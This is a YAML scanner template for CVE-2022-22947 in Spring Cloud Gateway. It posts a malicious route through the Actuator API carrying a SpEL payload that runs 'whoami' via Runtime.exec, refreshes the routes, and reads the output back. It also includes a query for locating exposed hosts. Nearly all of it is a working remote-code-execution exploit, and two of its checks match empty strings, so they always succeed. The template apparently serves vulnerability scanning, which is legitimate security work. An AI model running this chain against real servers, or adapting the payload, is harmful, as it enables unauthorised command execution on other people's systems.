name: spring-boot-CVE-2022-22947
manual: true
query: 'header="Vary: Accept-Encoding" || Header="X-Cache: HIT"'
transport: http
rules:
  r0:
    request:
      method: POST
      path: /actuator/gateway/routes/hacktest
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: en
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
          like Gecko) Chrome/97.0.4692.71 Safari/537.36
      body: "{\r\n      \"id\": \"hacktest\",\r\n      \"filters\": [{\r\n        \"name\":
        \"AddResponseHeader\",\r\n        \"args\": {\"name\": \"Result\",\"value\":
        \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new
        String[]{\\\"whoami\\\"}).getInputStream()))}\"}\r\n        }],\r\n      \"uri\":
        \"http://example.com\",\r\n      \"order\": 0\r\n    }"
      follow_redirects: true
    expression: response.status == 201 && response.raw_header.bcontains(b"hacktest")
  r1:
    request:
      method: POST
      path: /actuator/gateway/refresh
      headers:
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
          like Gecko) Chrome/97.0.4692.71 Safari/537.36
      follow_redirects: true
    expression: response.status == 200 && response.raw_header.bcontains(b"")
  r2:
    request:
      method: GET
      path: /actuator/gateway/routes/hacktest
      headers:
        Content-Type: application/x-www-form-urlencoded
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"")
expression: r0() && r1() && r2()
detail:
  author: gobysec@gmail.com
  links:
  - https://gobies.org/
  description: '描述: Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator
    API的情况下，将可以利用该漏洞执行任意命令。'
  tags: rce